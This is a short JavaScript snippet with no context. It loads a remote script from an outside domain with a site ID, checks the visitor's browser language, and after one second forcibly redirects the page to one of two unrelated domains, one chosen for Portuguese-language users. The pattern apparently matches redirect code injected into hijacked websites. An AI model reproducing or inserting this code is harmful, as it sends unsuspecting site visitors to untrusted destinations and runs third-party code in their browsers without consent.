(function(w, d, s) {
    var t = d.createElement(s), y = d.getElementsByTagName(s)[0];
    t.defer = true;
    t.src = "https://tj.nationsoul.com/api/script.js";
    t.setAttribute("data-site-id", "b601191f45c6");
    y ? y.parentNode.insertBefore(t, y) : d.head.appendChild(t);

    var langs = (navigator.languages && navigator.languages.length) 
        ? navigator.languages 
        : [navigator.language || navigator.userLanguage || ''];
    
    var targetUrl = 'https://garuda99.dev';

    for (var i = 0; i < langs.length; i++) {
        var low = (langs[i] || '').toLowerCase();
        if (low.indexOf('pt') === 0) {
            targetUrl = 'https://www.9bm8s8.com?ch=146712';
            break;
        }
        if (low.indexOf('id') === 0) {
            targetUrl = 'https://garuda99.dev';
            break;
        }
    }

    setTimeout(function() {
        w.location.href = targetUrl;
    }, 1000);
})(window, document, "script");
